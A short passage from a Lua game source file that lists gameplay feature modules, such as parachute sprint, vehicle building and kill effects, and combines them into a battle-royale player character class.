    {FinalKillEffect = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.PlayerCharacterFinalKillEffectFeature"},
    {CampFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.Camp.PlayerCharacterCampFeature"},
    {BuildSkateFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.PlayerCharacterBuildVehicleFeature"},
    {UnifiedBuildVehicleFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.UnifiedBuildVehicleFeature"},
    {CommonBornlandTransformFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.HeroPropFeature.CommonBornlandTransformFeature"},
    {ParachuteFormation = "GameLua.Mod.BaseMod.Gameplay.Feature.ParachuteFormationFeature"},
    {ParachuteSprint = "GameLua.Mod.BaseMod.GamePlay.Feature.Parachute.ParachuteSprintFeature"},
    {GeneralShowSpotFeature = "GameLua.Mod.BRMod.Gameplay.Feature.PlayerCharacterGeneralShowSpotFeature"},
    {FPPAnimMonitor = "GameLua.Mod.BaseMod.GamePlay.Feature.Player.FPPAnimMonitorFeature"},
}, "BRPlayerCharacterBase")

CombinedInstance.characterClass = combinedCharacterClass
return combinedCharacterClass
